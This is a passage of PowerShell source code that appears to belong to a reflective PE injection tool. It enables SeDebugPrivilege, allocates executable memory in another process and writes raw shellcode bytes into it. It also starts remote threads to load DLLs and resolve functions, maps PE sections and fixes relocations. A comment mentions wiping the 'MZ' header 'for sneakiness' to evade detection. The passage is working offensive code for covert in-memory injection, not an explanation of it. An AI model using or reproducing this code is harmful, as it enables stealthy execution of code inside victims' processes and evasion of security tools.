				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
